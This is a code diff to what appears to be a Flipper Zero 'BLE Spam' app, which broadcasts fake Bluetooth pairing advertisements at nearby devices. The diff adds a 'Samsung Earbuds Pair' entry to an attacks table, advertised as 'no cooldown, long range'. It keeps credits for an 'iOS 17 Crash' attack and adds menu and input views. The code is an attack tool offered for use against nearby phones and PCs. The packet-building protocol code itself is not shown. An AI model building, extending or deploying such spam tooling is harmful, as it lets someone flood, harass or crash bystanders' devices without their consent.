@@ -5,7 +5,13 @@
 #include <stdint.h>
 #include "protocols/_protocols.h"
 
-// NAPI
+// Hacked together by @Willy-JL
+// Custom adv API by @Willy-JL (idea by @xMasterX)
+// iOS 17 Crash by @ECTO-1A
+// Android, Samsung and Windows Pairs by @Spooks4576 and @ECTO-1A
+// Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
+
+// NAPI FUNCTIONS BY NO PROTO FOR OFW API COMPATIBILITY
 // TODO: Use __attribute__((aligned(2))) instead?
 // TODO: Use an offset of the base address?
 
@@ -183,12 +189,6 @@ bool napi_furi_hal_bt_custom_adv_stop() {
     }
 }
 
-// Hacked together by @Willy-JL
-// Custom adv API by @Willy-JL (idea by @xMasterX)
-// iOS 17 Crash by @ECTO-1A
-// Android and Windows Pairs by @Spooks4576 and @ECTO-1A
-// Research on behaviors and parameters by @Willy-JL, @ECTO-1A and @Spooks4576
-
 static Attack attacks[] = {
     {
         .title = "+ Kitchen Sink",
@@ -265,6 +265,19 @@ static Attack attacks[] = {
             },
     },
     {
+        .title = "Samsung Earbuds Pair",
+        .text = "No cooldown, long range",
+        .protocol = &protocol_smartthings,
+        .payload =
+            {
+                .random_mac = true,
+                .cfg =
+                    {
+                        .smartthings = {},
+                    },
+            },
+    },
+    {
         .title = "Windows Device Found",
         .text = "Requires enabling SwiftPair",
         .protocol = &protocol_swiftpair,
@@ -281,7 +294,7 @@ static Attack attacks[] = {
 
 #define ATTACKS_COUNT ((signed)COUNT_OF(attacks))
 
-uint16_t delays[] = {20, 50, 100, 200};
+static uint16_t delays[] = {20, 50, 100, 200};
 
 typedef struct {
     Ctx ctx;
@@ -292,8 +305,8 @@ typedef struct {
     int8_t index;
 } State;
 
-static int32_t adv_thread(void* ctx) {
-    State* state = ctx;
+static int32_t adv_thread(void* _ctx) {
+    State* state = _ctx;
     uint8_t size;
     uint16_t delay;
     uint8_t* packet;
@@ -346,10 +359,14 @@ enum {
     PageAboutCredits = PAGE_MAX,
 };
 
-static void draw_callback(Canvas* canvas, void* ctx) {
-    State* state = *(State**)ctx;
+static void draw_callback(Canvas* canvas, void* _ctx) {
+    State* state = *(State**)_ctx;
     const char* back = "Back";
     const char* next = "Next";
+    if(state->index < 0) {
+        back = "Next";
+        next = "Back";
+    }
     switch(state->index) {
     case PageStart - 1:
         next = "Spam";
@@ -437,7 +454,7 @@ static void draw_callback(Canvas* canvas, void* ctx) {
             "App+Spam: \e#WillyJL\e#\n"
             "Apple+Crash: \e#ECTO-1A\e#\n"
             "Android+Win: \e#Spooks4576\e#\n"
-            "                                   Version \e#2.0\e#",
+            "                                   Version \e#3.0\e#",
             false);
         break;
     default: {
@@ -479,8 +496,8 @@ static void draw_callback(Canvas* canvas, void* ctx) {
     }
 }
 
-static bool input_callback(InputEvent* input, void* ctx) {
-    View* view = ctx;
+static bool input_callback(InputEvent* input, void* _ctx) {
+    View* view = _ctx;
     State* state = *(State**)view_get_model(view);
     bool consumed = false;
 
@@ -497,6 +514,7 @@ static bool input_callback(InputEvent* input, void* ctx) {
                 if(input->type == InputTypeLong) {
                     if(advertising) toggle_adv(state);
                     state->ctx.attack = &attacks[state->index];
+                    scene_manager_set_scene_state(state->ctx.scene_manager, SceneConfig, 0);
                     scene_manager_next_scene(state->ctx.scene_manager, SceneConfig);
                 } else if(input->type == InputTypeShort) {
                     toggle_adv(state);
@@ -569,6 +587,18 @@ int32_t ble_spam(void* p) {
     view_set_input_callback(view_main, input_callback);
     view_dispatcher_add_view(state->ctx.view_dispatcher, ViewMain, view_main);
 
+    state->ctx.byte_input = byte_input_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher, ViewByteInput, byte_input_get_view(state->ctx.byte_input));
+
+    state->ctx.submenu = submenu_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher, ViewSubmenu, submenu_get_view(state->ctx.submenu));
+
+    state->ctx.text_input = text_input_alloc();
+    view_dispatcher_add_view(
+        state->ctx.view_dispatcher, ViewTextInput, text_input_get_view(state->ctx.text_input));
+
     state->ctx.variable_item_list = variable_item_list_alloc();
     view_dispatcher_add_view(
         state->ctx.view_dispatcher,
@@ -578,6 +608,15 @@ int32_t ble_spam(void* p) {
     view_dispatcher_attach_to_gui(state->ctx.view_dispatcher, gui, ViewDispatcherTypeFullscreen);
     scene_manager_next_scene(state->ctx.scene_manager, SceneMain);
     view_dispatcher_run(state->ctx.view_dispatcher);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewByteInput);
+    byte_input_free(state->ctx.byte_input);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewSubmenu);
+    submenu_free(state->ctx.submenu);
+
+    view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewTextInput);
+    text_input_free(state->ctx.text_input);
 
     view_dispatcher_remove_view(state->ctx.view_dispatcher, ViewVariableItemList);
     variable_item_list_free(state->ctx.variable_item_list);
